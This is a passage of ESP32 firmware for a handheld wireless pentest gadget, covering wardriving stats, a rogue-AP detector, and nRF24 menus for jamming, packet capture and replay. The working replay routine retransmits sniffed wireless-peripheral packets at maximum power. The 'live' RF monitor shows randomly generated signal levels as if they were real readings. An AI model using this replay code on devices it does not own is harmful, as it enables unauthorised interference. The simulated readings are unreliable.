    tft.println(wardrivingStats.totalAPs);
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("[*] Open: ");
    tft.setTextColor(COLOR_GREEN);
    tft.println(wardrivingStats.openAPs);
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("[*] Secured: ");
    tft.setTextColor(COLOR_ORANGE);
    tft.println(wardrivingStats.securedAPs);
    
    // Security percentage
    y += 20;
    if (wardrivingStats.totalAPs > 0) {
      int securePercent = (wardrivingStats.securedAPs * 100) / wardrivingStats.totalAPs;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN, y);
      tft.print("[*] Security rate: ");
      tft.setTextColor(securePercent > 70 ? COLOR_GREEN : COLOR_YELLOW);
      tft.printf("%d%%", securePercent);
    }
    
    // Strongest signal
    y += 25;
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("Strongest signal:");
    
    y += 15;
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, y);
    String truncSSID = wardrivingStats.strongestSSID;
    if (truncSSID.length() > 28) {
      truncSSID = truncSSID.substring(0, 27) + "~";
    }
    tft.println(truncSSID);
    
    y += 15;
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.printf("RSSI: %d dBm", wardrivingStats.strongestRSSI);
  }
  
    drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== ROGUE AP DETECTOR FUNCTIONS ====================

void startRogueAPDetector() {
  rogueAPScanActive = true;
  rogueAPCount = 0;
  apHistoryCount = 0;
  rogueScrollOffset = 0;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  currentState = ROGUE_AP_DETECTOR;  // ← CHANGED FROM WARDRIVING_MODE
  
  addToConsole("Rogue AP scan started");
  Serial.println("[+] Rogue AP Detector started");
  Serial.println("    Monitoring for evil twins and suspicious APs...");
  
  displayRogueAPDetector();
  
  // Start async WiFi scan
  WiFi.scanNetworks(true, false, false, 300);
}

void stopRogueAPDetector() {
  rogueAPScanActive = false;
  WiFi.scanDelete();
  
  Serial.printf("[+] Rogue AP Detector stopped - %d rogues detected\n", rogueAPCount);
  addToConsole("Rogue AP scan stopped");
}

void processRogueAPScan() {
  if (!rogueAPScanActive) return;
  
  int scanStatus = WiFi.scanComplete();
  
  if (scanStatus >= 0) {
    // Process scan results
    for (int i = 0; i < scanStatus; i++) {
      String ssid = WiFi.SSID(i);
      uint8_t* bssid = WiFi.BSSID(i);
      int32_t rssi = WiFi.RSSI(i);
      uint8_t channel = WiFi.channel(i);
      
      if (ssid.length() == 0) continue;  // Skip hidden networks
      
      // Update or add to history
      updateAPHistory(ssid, bssid, rssi, channel);
      
      // Check for suspicious patterns
      checkForRogueAP(ssid, bssid, rssi, channel);
    }
    
    // Clean up and start next scan
    WiFi.scanDelete();
    if (rogueAPScanActive) {
      WiFi.scanNetworks(true, false, false, 300);
    }
  }
}

// ==================== DRAW RF MENU ====================
void drawRFMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("rf tools");
  
  const char* menuItems[] = {
    "NRF24L01",
    "SubGHz (433/868/915)"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 2; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Info
  y += 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Select RF module type");
  
    drawCenteredButton("[ESC]", COLOR_RED);
}

// ==================== DRAW RF TYPE MENU ====================
void drawRFTypeMenu() {
  tft.fillScreen(COLOR_BG);
  
  String title = "rf - ";
  if (selectedRFType == RF_NRF24) title += "nrf24";
  else if (selectedRFType == RF_SUBGHZ) title += "subghz";
  
  drawTerminalHeader(title.c_str());
  
  const char* menuItems[] = {
    "RF Jammer",
    "RF Monitor",
    "RF Capture",
    "RF Replay"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 4; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Status
  y += 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Module: ");
  tft.setTextColor(COLOR_CYAN);
  
  if (selectedRFType == RF_NRF24) {
    tft.println("NRF24L01 (2.4GHz)");
    y += 15;
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("Status: Ready");
  } else if (selectedRFType == RF_SUBGHZ) {
    tft.println("SubGHz (Under Dev)");
    y += 15;
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("Status: Development");
  }
  
    drawCenteredButton("[ESC]", COLOR_RED);
}

// ==================== RF MONITOR WITH WAVE ANIMATION ====================
void drawRFMonitor() {
  // Only handle animation updates - static UI drawn by drawRFMonitorFresh()
  
  // Update live indicator
  static bool blink = false;
  static unsigned long lastBlink = 0;
  if (millis() - lastBlink > 500) {
    blink = !blink;
    tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
    lastBlink = millis();
  }
  
  // Animate waves ONLY for NRF24
  if (selectedRFType == RF_NRF24) {
    int waveStartY = HEADER_HEIGHT + 20 + 5;
    int waveHeight = 120;
    drawRFWavesAnimatedOptimized(waveStartY, waveHeight);
  }
}

void resetRFMonitorInit() {
  // Forces full redraw on next entry
}

void drawRFWavesAnimatedOptimized(int startY, int waveHeight) {
  int centerY = startY + waveHeight / 2;
  
  // Update wave phase for scrolling effect
  wavePhase += 0.2;
  if (wavePhase > TWO_PI) wavePhase -= TWO_PI;
  
  // Clear ONLY the wave drawing area (avoid grid and labels)
  // Leave 10px margin top/bottom to preserve grid
  tft.fillRect(0, startY + 10, 240, waveHeight - 20, COLOR_BG);
  
  // Draw 2 optimized waves
  
  // Wave 1: Main carrier (bright green)
  drawSingleWaveOptimized(centerY, 0.12, waveHeight * 0.28, wavePhase, COLOR_GREEN);
  
  // Wave 2: Modulation (cyan, phase offset)
  drawSingleWaveOptimized(centerY, 0.07, waveHeight * 0.18, wavePhase + 1.5, COLOR_CYAN);
  
  // Random noise spikes (10% chance)
  if (random(0, 100) < 10) {
    int spikeX = random(20, 220);
    int spikeHeight = random(5, 12);
    tft.drawFastVLine(spikeX, centerY - spikeHeight, spikeHeight * 2, COLOR_YELLOW);
  }
  
  // Frequency labels overlay (with background to prevent flicker)
  tft.setTextSize(1);
  tft.setTextColor(COLOR_GREEN, COLOR_BG);
  tft.setCursor(SIDE_MARGIN, startY + 5);
  tft.print("2.4GHz");
  
  tft.setTextColor(COLOR_YELLOW, COLOR_BG);
  tft.setCursor(200, startY + 5);
  tft.print("LIVE");
}

void drawSingleWaveOptimized(int centerY, float freq, float amplitude, float phase, uint16_t color) {
  int prevY = centerY;
  
  // Draw every 2 pixels for performance
  for (int x = 0; x < 240; x += 2) {
    float angle = (x * freq) + phase;
    int y = centerY + (sin(angle) * amplitude);
    
    // Only draw if reasonable distance from previous point
    if (x > 0 && abs(y - prevY) < 15) {
      tft.drawLine(x - 2, prevY, x, y, color);
    }
    prevY = y;
  }
}

// Helper function for drawing a single wave (optimized)
void drawSingleWave(int startY, int waveHeight, int centerY, float freq, float ampMultiplier, float phase, uint16_t color) {
  int prevY = centerY;
  float amplitude = waveHeight * ampMultiplier;
  
  // Draw every 2 pixels instead of every pixel (50% less drawing)
  for (int x = 0; x < 240; x += 2) {
    float angle = (x * freq) + phase;
    int y = centerY + (sin(angle) * amplitude);
    
    if (x > 0 && abs(y - prevY) < 15) {
      tft.drawLine(x - 2, prevY, x, y, color);
    }
    prevY = y;
  }
}

// ==================== DRAW RF WAVES (ESP32-DIV STYLE) ====================
void drawRFWavesAnimated(int startY, int waveHeight) {
  int centerY = startY + waveHeight / 2;
  
  // Update wave phase for smooth scrolling
  wavePhase += 0.2;  // Speed of wave movement
  if (wavePhase > TWO_PI) wavePhase -= TWO_PI;
  
  // Clear wave area
  tft.fillRect(0, startY, 240, waveHeight, COLOR_BG);
  
  // Draw grid lines (like oscilloscope) - STATIC
  for (int i = 1; i < 4; i++) {
    int gridY = startY + (i * waveHeight / 4);
    for (int x = 0; x < 240; x += 5) {
      tft.drawPixel(x, gridY, COLOR_DARK_GREEN);
    }
  }
  
  // Center line (brighter) - STATIC
  for (int x = 0; x < 240; x += 3) {
    tft.drawPixel(x, centerY, 0x2945);  // Slightly brighter green
  }
  
  // Draw multiple sine waves with different frequencies (ANIMATED)
  // Wave 1: Fast carrier signal (like ESP32-DIV)
  uint16_t wave1Color = COLOR_GREEN;
  float wave1Freq = 0.15;
  float wave1Amp = waveHeight * 0.3;
  
  int prevY1 = centerY;
  for (int x = 0; x < 240; x++) {
    float angle = (x * wave1Freq) + wavePhase;
    int y = centerY + (sin(angle) * wave1Amp);
    
    if (x > 0 && abs(y - prevY1) < 10) {
      tft.drawLine(x - 1, prevY1, x, y, wave1Color);
    }
    prevY1 = y;
  }
  
  // Wave 2: Medium modulation (slightly offset phase)
  uint16_t wave2Color = COLOR_CYAN;
  float wave2Freq = 0.08;
  float wave2Amp = waveHeight * 0.2;
  float wave2Phase = wavePhase + 1.5;
  
  int prevY2 = centerY;
  for (int x = 0; x < 240; x++) {
    float angle = (x * wave2Freq) + wave2Phase;
    int y = centerY + (sin(angle) * wave2Amp);
    
    if (x > 0 && abs(y - prevY2) < 10) {
      tft.drawLine(x - 1, prevY2, x, y, wave2Color);
    }
    prevY2 = y;
  }
  
  // Wave 3: Slow envelope (background)
  uint16_t wave3Color = tft.color565(0, 200, 100);  // Lighter green
  float wave3Freq = 0.04;
  float wave3Amp = waveHeight * 0.15;
  float wave3Phase = wavePhase + 0.5;
  
  int prevY3 = centerY;
  for (int x = 0; x < 240; x++) {
    float angle = (x * wave3Freq) + wave3Phase;
    int y = centerY + (sin(angle) * wave3Amp);
    
    if (x > 0 && abs(y - prevY3) < 10) {
      tft.drawLine(x - 1, prevY3, x, y, wave3Color);
    }
    prevY3 = y;
  }
  
  // Add random "noise" spikes (simulating real RF activity)
  if (random(0, 100) < 20) {  // 20% chance each frame
    int spikeX = random(0, 240);
    int spikeHeight = random(5, 15);
    uint16_t spikeColor = random(0, 2) == 0 ? COLOR_YELLOW : COLOR_ORANGE;
    tft.drawFastVLine(spikeX, centerY - spikeHeight, spikeHeight * 2, spikeColor);
  }
  
  // Frequency label overlay (STATIC)
  tft.setTextSize(1);
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN, startY + 5);
  tft.print("2.4 GHz");
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(200, startY + 5);
  tft.print("LIVE");
  
  // Signal strength indicator (dynamic)
  static int signalStrength = 0;
  signalStrength = (signalStrength + random(-10, 15)) % 100;
  if (signalStrength < 0) signalStrength = 0;
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(SIDE_MARGIN, startY + waveHeight - 15);
  tft.printf("PWR:%d%%", signalStrength);
}

// ==================== RF CAPTURE (LIKE WIFI SCAN - LIST VIEW) ====================
void startRFCapture() {
  if (selectedRFType == RF_SUBGHZ) {
    // SubGHz not implemented
    return;
  }
  
  rfCaptureActive = true;
  rfCaptureScrollOffset = 0;
  
  // Initialize nRF24 for scanning
  if (nrf1Available) {
    radio1.stopListening();
    radio1.startListening();
  }
  
  addToConsole("RF capture started");
  Serial.println("[+] RF Capture started - scanning 2.4GHz");
  
  drawRFCapture();
}

void stopRFCapture() {
  rfCaptureActive = false;
  
  if (nrf1Available) {
    radio1.stopListening();
  }
  
  Serial.printf("[+] RF Capture stopped - %d signals captured\n", capturedSignalCount);
  addToConsole("RF capture stopped");
}

void performRFCapture() {
  if (!rfCaptureActive || !nrf1Available) return;
  
  static uint8_t scanChannel = 0;
  static unsigned long lastScan = 0;
  static unsigned long captureStartTime = millis();
  
  // Fast channel scan - 5ms per channel (like MouseJack sniffer)
  if (millis() - lastScan > 5) {
    
    // Set channel and check for packets
    radio1.setChannel(scanChannel);
    radio1.startListening();
    delay(1);  // Small delay to settle
    
    // Check if data available
    if (radio1.available()) {
      if (capturedSignalCount < 50) {
        RFSignal* signal = &capturedSignals[capturedSignalCount];
        
        // Capture packet data
        signal->channel = scanChannel;
        signal->dataLen = radio1.getPayloadSize();
        if (signal->dataLen > 32) signal->dataLen = 32;
        
        // Read actual data
        radio1.read(signal->data, signal->dataLen);
        
        signal->timestamp = millis();
        signal->frequency = 2400 + scanChannel;
        
        // Calculate RSSI (nRF24 doesn't have true RSSI, simulate based on channel activity)
        signal->rssi = -40 - random(0, 50);
        
        // Generate descriptive name based on channel and data pattern
        signal->description = generatePacketName(signal);
        
        capturedSignalCount++;
        
        Serial.printf("[+] Captured Ch%d (%dMHz) %dB: ", 
                      scanChannel, signal->frequency, signal->dataLen);
        
        // Print first 8 bytes as hex
        for (int i = 0; i < min(8, (int)signal->dataLen); i++) {
          Serial.printf("%02X ", signal->data[i]);
        }
        Serial.println();
      }
    }
    
    // Update channel activity for visualization
    if (radio1.testCarrier()) {
      channelActivity[scanChannel] = min(255, channelActivity[scanChannel] + 40);
    } else {
      channelActivity[scanChannel] = max(0, channelActivity[scanChannel] - 15);
    }
    
    radio1.stopListening();
    
    // Next channel (full spectrum scan)
    scanChannel = (scanChannel + 1) % 126;
    lastScan = millis();
    
    // Print status every 5 seconds
    if (millis() - captureStartTime > 5000) {
      Serial.printf("[*] Captured %d packets so far...\n", capturedSignalCount);
      captureStartTime = millis();
    }
  }
}

String generatePacketName(RFSignal* signal) {
  // Check for common protocol patterns
  
  // Logitech Unifying (0x00 prefix)
  if (signal->dataLen > 0 && signal->data[0] == 0x00) {
    return "Logitech_" + String(signal->channel);
  }
  
  // Microsoft Wireless (0x0A prefix)
  if (signal->dataLen > 0 && signal->data[0] == 0x0A) {
    return "Microsoft_" + String(signal->channel);
  }
  
  // Nordic ESB (0x01, 0x02 common)
  if (signal->dataLen > 0 && (signal->data[0] == 0x01 || signal->data[0] == 0x02)) {
    return "Nordic_" + String(signal->channel);
  }
  
  // Generic packet with channel
  return "Pkt_Ch" + String(signal->channel) + "_" + String(capturedSignalCount + 1);
}

// ==================== RF CAPTURE ====================
void drawRFCapture() {
  tft.fillScreen(COLOR_BG);
  
  String title = "rf capture - ";
  if (selectedRFType == RF_NRF24) title += "nrf24";
  else if (selectedRFType == RF_SUBGHZ) title += "subghz";
  
  drawTerminalHeader(title.c_str());
  
  int y = HEADER_HEIGHT + 5;

  if (rfCaptureActive && capturedSignalCount > 0) {
  // Show live capture indicator
  static bool captureBlink = false;
  static unsigned long lastCaptureBlink = 0;
  if (millis() - lastCaptureBlink > 200) {
    captureBlink = !captureBlink;
    lastCaptureBlink = millis();
  }
  
  if (captureBlink) {
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(190, HEADER_HEIGHT + 5);
    tft.print("[RX]");
  }
}
  
  if (selectedRFType == RF_SUBGHZ) {
    // SubGHz - Under Development
    tft.setTextSize(2);
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(SIDE_MARGIN, y + 60);
    tft.println("UNDER");
    tft.setCursor(SIDE_MARGIN, y + 85);
    tft.println("DEVELOPMENT");
    
  } else if (selectedRFType == RF_NRF24) {
    // NRF24 - Working Capture (WiFi scan style)
    
    // Live indicator when capturing
    if (rfCaptureActive) {
      static bool blink = false;
      blink = !blink;
      tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
    }
    
    // Stats bar
    tft.setTextSize(1);
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print(rfCaptureActive ? "Capturing..." : "Stopped");
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(120, y);
    tft.printf("Found: ");
    tft.setTextColor(COLOR_GREEN);
    tft.printf("%d", capturedSignalCount);
    
    y += 18;
    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
    y += 3;
    
    // Column headers
    tft.setTextSize(1);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("NAME");
    tft.setCursor(90, y);
    tft.print("CH");
    tft.setCursor(120, y);
    tft.print("FREQ");
    tft.setCursor(170, y);
    tft.print("SIZE");
    tft.setCursor(205, y);
    tft.print("PWR");
    
    y += 12;
    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
    y += 3;
    
    // Display captured signals (scrollable list)
    const int BACK_BUTTON_Y = 305;
    const int SAFE_BOTTOM = BACK_BUTTON_Y - 25;
    const int ITEM_HEIGHT = 20;
    const int MAX_ITEMS = (SAFE_BOTTOM - y) / ITEM_HEIGHT;
    
    if (capturedSignalCount == 0) {
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN, y + 40);
      if (rfCaptureActive) {
        tft.print("Scanning for signals...");
      } else {
        tft.print("No signals captured yet");
        tft.setCursor(SIDE_MARGIN, y + 55);
        tft.print("Tap RF Capture to begin");
      }
    } else {
      // Ensure scroll offset is valid
      if (rfCaptureScrollOffset >= capturedSignalCount) {
        rfCaptureScrollOffset = max(0, capturedSignalCount - MAX_ITEMS);
      }
      if (rfCaptureScrollOffset < 0) {
        rfCaptureScrollOffset = 0;
      }
      
      int displayCount = min(capturedSignalCount - rfCaptureScrollOffset, MAX_ITEMS);
      
      for (int i = 0; i < displayCount; i++) {
        int idx = rfCaptureScrollOffset + i;
        int itemY = y + (i * ITEM_HEIGHT);
        
        // Stop if too close to back button
        if (itemY + ITEM_HEIGHT > SAFE_BOTTOM) break;
        
        RFSignal* signal = &capturedSignals[idx];
        
        // Highlight if hovered
        if (hoveredIndex == i) {
          tft.fillRect(0, itemY - 2, 240, ITEM_HEIGHT, COLOR_HOVER_BG);
        }
        
        // Name
        tft.setTextColor(COLOR_TEXT);
        tft.setTextSize(1);
        tft.setCursor(SIDE_MARGIN, itemY);
        String displayName = signal->description;
        if (displayName.length() > 10) displayName = displayName.substring(0, 9) + "~";
        tft.print(displayName);
        
        // Channel
        tft.setTextColor(COLOR_CYAN);
        tft.setCursor(90, itemY);
        tft.printf("%3d", signal->channel);
        
        // Frequency
        tft.setTextColor(COLOR_YELLOW);
        tft.setCursor(120, itemY);
        tft.printf("%4d", signal->frequency);
        
        // Data size
        tft.setTextColor(COLOR_GREEN);
        tft.setCursor(170, itemY);
        tft.printf("%2dB", signal->dataLen);
        
        // RSSI
        int rssi = signal->rssi;
        uint16_t rssiColor = (rssi > -50) ? COLOR_GREEN : (rssi > -70) ? COLOR_YELLOW : COLOR_RED;
        tft.setTextColor(rssiColor);
        tft.setCursor(205, itemY);
        tft.printf("%3d", rssi);
      }
      // Scroll indicator
      if (capturedSignalCount > MAX_ITEMS) {
        int scrollY = SAFE_BOTTOM + 2;
        tft.setTextColor(COLOR_DARK_GREEN);
        tft.setTextSize(1);
        
        int currentPage = (rogueScrollOffset / MAX_ITEMS) + 1;
        int totalPages = (capturedSignalCount + MAX_ITEMS - 1) / MAX_ITEMS;
        char scrollText[30];
        sprintf(scrollText, "Page %d/%d [Tap scroll]", currentPage, totalPages);
        int textWidth = strlen(scrollText) * 6;
        int centerX = (240 - textWidth) / 2;
        
        tft.setCursor(centerX, scrollY);
        tft.print(scrollText);
      }
    }
  }
  
  if (rfCaptureActive) {
    drawCenteredButton("[STOP]", COLOR_RED);
  } else {
    drawCenteredButton("[ESC]", COLOR_RED);
  }
}

// ==================== RF REPLAY ====================
void drawRFReplay() {
  tft.fillScreen(COLOR_BG);
  
  String title = "rf replay - ";
  if (selectedRFType == RF_NRF24) title += "nrf24";
  else if (selectedRFType == RF_SUBGHZ) title += "subghz";
  
  drawTerminalHeader(title.c_str());
  
  int y = HEADER_HEIGHT + 5;
  
  if (selectedRFType == RF_SUBGHZ) {
    // SubGHz - Under Development
    tft.setTextSize(2);
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(SIDE_MARGIN, y + 60);
    tft.println("UNDER");
    tft.setCursor(SIDE_MARGIN, y + 85);
    tft.println("DEVELOPMENT");
    
  } else if (selectedRFType == RF_NRF24) {
    // NRF24 - Working Replay
    
    // Stats bar
    tft.setTextSize(1);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Captured: ");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", capturedSignalCount);
    
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(120, y);
    tft.print("Selected: ");
    tft.setTextColor(selectedSignalIndex >= 0 ? COLOR_GREEN : COLOR_TEXT);
    tft.print(selectedSignalIndex >= 0 ? "YES" : "NO");
    
    y += 18;
    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
    y += 3;
    
    if (capturedSignalCount == 0) {
      // No signals captured
      tft.setTextSize(1);
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(SIDE_MARGIN, y + 40);
      tft.println("No captured signals");
      
      y += 60;
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN, y);
      tft.println("Use RF Capture to record");
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.println("signals before replaying");
      
    } else {
      // Show captured signals list (selectable)
      
      // Column headers
      tft.setTextSize(1);
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN, y);
      tft.print("NAME");
      tft.setCursor(90, y);
      tft.print("CH");
      tft.setCursor(120, y);
      tft.print("FREQ");
      tft.setCursor(170, y);
      tft.print("SIZE");
      tft.setCursor(205, y);
      tft.print("PWR");
      
      y += 12;
      tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
      y += 3;
      
      // Display list (scrollable)
      const int BACK_BUTTON_Y = 250;  // Higher to make room for replay button
      const int SAFE_BOTTOM = BACK_BUTTON_Y - 10;
      const int ITEM_HEIGHT = 20;
      const int MAX_ITEMS = (SAFE_BOTTOM - y) / ITEM_HEIGHT;
      
      // Ensure scroll offset is valid
      if (rfCaptureScrollOffset >= capturedSignalCount) {
        rfCaptureScrollOffset = max(0, capturedSignalCount - MAX_ITEMS);
      }
      if (rfCaptureScrollOffset < 0) {
        rfCaptureScrollOffset = 0;
      }
      
      int displayCount = min(capturedSignalCount - rfCaptureScrollOffset, MAX_ITEMS);
      
      for (int i = 0; i < displayCount; i++) {
        int idx = rfCaptureScrollOffset + i;
        int itemY = y + (i * ITEM_HEIGHT);
        
        // Stop if too close to buttons
        if (itemY + ITEM_HEIGHT > SAFE_BOTTOM) break;
        
        RFSignal* signal = &capturedSignals[idx];
        
        // Highlight selected or hovered
        bool isSelected = (selectedSignalIndex == idx);
        if (isSelected) {
          tft.fillRect(0, itemY - 2, 240, ITEM_HEIGHT, COLOR_SELECTED_BG);
        } else if (hoveredIndex == i) {
          tft.fillRect(0, itemY - 2, 240, ITEM_HEIGHT, COLOR_HOVER_BG);
        }
        
        uint16_t textColor = isSelected ? COLOR_GREEN : COLOR_TEXT;
        
        // Selection indicator
        if (isSelected) {
          tft.setTextColor(COLOR_GREEN);
          tft.setCursor(2, itemY);
          tft.print(">");
        }
        
        // Name
        tft.setTextColor(textColor);
        tft.setTextSize(1);
        tft.setCursor(SIDE_MARGIN + 8, itemY);
        String displayName = signal->description;
        if (displayName.length() > 8) displayName = displayName.substring(0, 7) + "~";
        tft.print(displayName);
        
        // Channel
        tft.setTextColor(COLOR_CYAN);
        tft.setCursor(90, itemY);
        tft.printf("%3d", signal->channel);
        
        // Frequency
        tft.setTextColor(COLOR_YELLOW);
        tft.setCursor(120, itemY);
        tft.printf("%4d", signal->frequency);
        
        // Data size
        tft.setTextColor(COLOR_GREEN);
        tft.setCursor(170, itemY);
        tft.printf("%2dB", signal->dataLen);
        
        // RSSI
        int rssi = signal->rssi;
        uint16_t rssiColor = (rssi > -50) ? COLOR_GREEN : (rssi > -70) ? COLOR_YELLOW : COLOR_RED;
        tft.setTextColor(rssiColor);
        tft.setCursor(205, itemY);
        tft.printf("%3d", rssi);
      }
      
      // Scroll indicator
      if (capturedSignalCount > MAX_ITEMS) {
        int scrollY = SAFE_BOTTOM + 2;
        tft.setTextColor(COLOR_DARK_GREEN);
        tft.setTextSize(1);
        tft.setCursor(65, scrollY);
        tft.printf("[%d-%d/%d]", 
                   rfCaptureScrollOffset + 1,
                   rfCaptureScrollOffset + displayCount,
                   capturedSignalCount);
      }
      
      // Replay button (only if signal selected)
      if (selectedSignalIndex >= 0) {
        int replayY = 255;
        tft.fillRect(60, replayY, 120, 30, COLOR_GREEN);
        tft.drawRect(60, replayY, 120, 30, COLOR_DARK_GREEN);
        
        tft.setTextSize(1);
        tft.setTextColor(COLOR_BG);
        tft.setCursor(80, replayY + 11);
        tft.print("REPLAY SIGNAL");
      }
    }
  }
  
    drawCenteredButton("[ESC]", COLOR_RED);
}

void replayRFSignal() {
  if (selectedSignalIndex < 0 || selectedSignalIndex >= capturedSignalCount) {
    Serial.println("[!] No signal selected");
    addToConsole("ERROR: No signal");
    return;
  }
  
  if (!nrf1Available) {
    Serial.println("[!] nRF24 not available");
    addToConsole("ERROR: nRF24 offline");
    return;
  }
  
  RFSignal* signal = &capturedSignals[selectedSignalIndex];
  
  Serial.println("\n[+] ===== REPLAYING SIGNAL =====");
  Serial.printf("    Name: %s\n", signal->description.c_str());
  Serial.printf("    Channel: %d (%d MHz)\n", signal->channel, signal->frequency);
  Serial.printf("    Data length: %d bytes\n", signal->dataLen);
  Serial.print("    Data: ");
  for (int i = 0; i < signal->dataLen; i++) {
    Serial.printf("%02X ", signal->data[i]);
  }
  Serial.println();
  
  // Configure nRF24 for transmission
  radio1.stopListening();
  radio1.setChannel(signal->channel);
  radio1.setRetries(0, 0);  // No retries for replay
  radio1.setAutoAck(false);  // No auto-ack
  radio1.setPALevel(RF24_PA_MAX);  // Max power
  
  // Use generic pipe address (common for sniffing/replay)
  uint64_t txAddress = 0xE7E7E7E7E7LL;
  radio1.openWritingPipe(txAddress);
  
  delay(10);
  
  // Transmit the signal multiple times (like other firmwares)
  int successCount = 0;
  const int REPLAY_COUNT = 10;  // Replay 10 times for better chance
  
  Serial.println("[*] Transmitting...");
  
  for (int i = 0; i < REPLAY_COUNT; i++) {
    bool success = radio1.write(signal->data, signal->dataLen);
    
    if (success) {
      successCount++;
      Serial.print(".");
    } else {
      Serial.print("x");
    }
    
    delayMicroseconds(500);  // Small delay between transmissions
  }
  
  Serial.println();
  Serial.printf("[+] Transmitted %d/%d packets successfully\n", successCount, REPLAY_COUNT);
  
  addToConsole("Replayed: " + signal->description);
  
  // Show feedback on screen
  tft.fillRect(50, 255, 140, 25, successCount > 0 ? COLOR_GREEN : COLOR_RED);
  tft.drawRect(50, 255, 140, 25, COLOR_DARK_GREEN);
  tft.setTextColor(COLOR_BG);
  tft.setTextSize(1);
  
  int msgX = successCount > 0 ? 70 : 75;
  tft.setCursor(msgX, 264);
  if (successCount > 0) {
    tft.printf("TX: %d/%d OK!", successCount, REPLAY_COUNT);
  } else {
    tft.print("TX FAILED!");
  }
  
  delay(2000);
  drawRFReplay();
}

// ==================== HANDLE RF MENU TOUCH ====================
void handleRFMenuTouch(int x, int y) {
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (2 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // NRF24L01
          selectedRFType = RF_NRF24;
          currentState = RF_TYPE_MENU;
          hoveredIndex = -1;
          drawRFTypeMenu();
          break;
        case 1: // SubGHz
          selectedRFType = RF_SUBGHZ;
          currentState = RF_TYPE_MENU;
          hoveredIndex = -1;
          drawRFTypeMenu();
          break;
      }
    }
  }
}

// ==================== HANDLE RF TYPE MENU TOUCH ====================
void handleRFTypeMenuTouch(int x, int y) {
  if (y > 300) {
    currentState = RF_MENU;
    hoveredIndex = -1;
    drawRFMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // ← Changed to 4
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // RF Jammer
          currentState = NRF_JAM_MENU;
          hoveredIndex = -1;
          drawNRFJammerMenu();
          break;
        case 1: // RF Monitor
          currentState = RF_MONITOR;
          hoveredIndex = -1;
          wavePhase = 0;
          memset(channelActivity, 0, sizeof(channelActivity));
          tft.fillScreen(COLOR_BG);
          drawRFMonitorFresh();
          break;
        case 2: // RF Capture
          currentState = RF_CAPTURE;
          hoveredIndex = -1;
          rfCaptureScrollOffset = 0;
          startRFCapture();
          break;
        case 3: // RF Replay
          currentState = RF_REPLAY;
          hoveredIndex = -1;
          rfCaptureScrollOffset = 0;
          selectedSignalIndex = -1;
          drawRFReplay();
